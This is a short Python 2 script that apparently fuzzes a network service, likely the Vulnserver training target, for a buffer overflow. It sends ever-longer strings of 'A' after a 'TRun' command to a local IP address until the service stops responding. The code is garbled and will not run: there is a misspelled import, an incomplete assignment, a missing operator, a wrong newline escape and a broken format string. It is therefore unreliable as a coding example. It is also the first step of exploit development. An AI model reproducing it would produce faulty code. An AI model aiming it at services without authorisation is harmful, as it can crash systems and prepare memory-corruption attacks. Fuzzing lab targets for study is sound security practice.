#!/usr/bin/python
import sys, socket
frome time import sleep

buffer = "A" *

while True:
        try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.0.149',80))

                s.send(('TRun' + buffer 'r\n'))
                s.close()
                sleep(1)
                buffer = buffer + 'A'*100

        except:
                print 'fuzzing crashed at %bytes' % str(len(buffer))
                sys.exit()
